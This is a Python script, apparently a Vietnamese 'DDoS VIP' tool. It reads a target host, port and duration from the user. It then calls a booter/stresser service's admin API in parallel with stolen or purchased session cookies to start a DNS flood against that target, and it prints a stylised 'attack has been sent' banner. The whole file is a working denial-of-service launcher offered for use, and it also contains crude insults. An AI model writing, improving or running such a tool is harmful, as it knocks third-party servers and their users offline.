import requests
import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import sys
import nguyenthanhngoc
from nguyenthanhngoc import *
import time
from time import sleep
import os

def clear():
    os.system("cls" if os.name == "nt" else "clear")
clear()

def check_internet_connection():
    try:
        response = requests.get("https://www.google.com/", timeout=5)
        return True
    except requests.ConnectionError:
        return False

if not check_internet_connection():
    print("\n\033[1;31mĐịnh Bug À ? Có Cái Con Cặc Em Nhé !")
    sys.exit(1)

def loading(seconds):
    print("\033[1;36mLoading", end="", flush=True)
    for _ in range(seconds):
        time.sleep(1)
        print(".", end="", flush=True)
    print("\033[1;36m Done !")

loading(5)

def clear():
    os.system("cls" if os.name == "nt" else "clear")
clear()

def send_request(host, port, time, cookie):
    api = f'https://redstresser.org/complexx/adminhub.php?type=start&host={host}&port={port}&time={time}&method=DNS&totalservers=1'
    headers = {
        'authority': 'redstresser.org',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Cookie': cookie,
        'Origin': 'https://redstresser.org',
        'Sec-Ch-Ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
    }
    
    try:
        guiheader = requests.get(api, headers=headers)
        return "SUCCESS" in guiheader.text
    except Exception as e:
        print(f"Lỗi {cookie}: {e}")
        return False

def l4(host, port, time):
    cookies = ['ck1', 'ck2', 'ck3', 'ck4']
    results = []
    with ThreadPoolExecutor(max_workers=len(cookies)) as executor:
        futures = [executor.submit(send_request, host, port, time, cookie) for cookie in cookies]
        for future in as_completed(futures):
            results.append(future.result())

    if any(results):
        now = datetime.datetime.now()
        gio = now.strftime("%H:%M:%S")
        ngay = now.strftime("%d/%m/%Y")
        print(f"""\033[35m𝗔𝘁𝘁𝗮𝗰𝗸 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝘀𝗲𝗻𝘁! ⚡
〡𝗔𝘁𝘁𝗮𝗰𝗸 𝗖𝗼𝗻𝗳𝗶𝗴𝘂𝗿𝗮𝘁𝗶𝗼𝗻:
     • 𝗔𝘁𝘁𝗮𝗰𝗸 𝗕𝘆: Thanh Ngọc [ Cá Dz ]
     • 𝗛𝗼𝘀𝘁: {host}
     • 𝗣𝗼𝗿𝘁: {port}
     • 𝗧𝗶𝗺𝗲: {time}s
     • 𝗨𝘀𝗲𝗱 𝗖𝗼𝗻𝗰𝘂𝗿𝗿𝗲𝗻𝘁𝘀: All
     • 𝗧𝗶𝗺𝗲 𝗨𝘀𝗮𝗴𝗲: {gio}
     • 𝗗𝗮𝘁𝗲 𝗨𝘀𝗮𝗴𝗲: {ngay}\033[0m""")
        print("\033[1;39mAttack All Apii")
        sleep(120)
        clear()

def demo_l4():
    while True:
        Write.Print(f"""
██╗   ██╗███████╗    ████████╗███████╗ █████╗ ███╗   ███╗
██║   ██║██╔════╝    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
██║   ██║███████╗       ██║   █████╗  ███████║██╔████╔██║
╚██╗ ██╔╝╚════██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
 ╚████╔╝ ███████║       ██║   ███████╗██║  ██║██║ ╚═╝ ██║
  ╚═══╝  ╚══════╝       ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
  
┌───────────────────└┐ 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 └┐──────────────────┐
│
│   𝐓𝐎𝐎𝐋 𝐍𝐀𝐌𝐄: DDoS VIP BY VIRUS
│   𝐕𝐄𝐑𝐒𝐈𝐎𝐍: 2.0
│   𝐔𝐏𝐃𝐀𝐓𝐄𝐃 𝐎𝐍 𝐃𝐀𝐓𝐄: 20-09-2004
│   𝐒𝐔𝐏𝐏𝐎𝐑𝐓 𝐆𝐑𝐎𝐔𝐏: t.me/VirusTeam_Chat
│   𝐓𝐎𝐎𝐋 𝐀𝐃𝐌𝐈𝐍: 𓂄𓆩 Virus 𓆪𓂁︎ x Tmr Virus
│
└──────────────────────────────────────────────────┘\n""", Colors.rainbow, interval=0.005)
        print("\033[1;36m ➣ ➣ ➣ ➣ ➣ ➣ ➣ ➣ ➣ ➣ ➣ ➣ ➣ ➣ ➣ ➣ ➣ ➣ ➣ ➣")
        ddos = input("\n\033[31m@thanhngocc:\033[36mroot \033[39m[✓]-➣\033[33m ")
        host, port, time = ddos.split()
        l4(host, port, time)

demo_l4()
